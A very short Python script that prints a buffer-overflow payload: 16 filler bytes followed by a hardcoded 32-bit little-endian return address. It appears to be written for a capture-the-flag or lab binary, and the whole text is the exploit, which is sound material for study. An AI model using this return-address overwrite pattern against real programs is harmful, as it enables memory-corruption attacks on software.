import sys
byte = b"\x11" * 16
sys.stdout.buffer.write(byte)

hexVal = byte.hex()

sys.stdout.buffer.write(0x08048c23.to_bytes(4, "little"))
sys.stdout.buffer.write(b"\0a")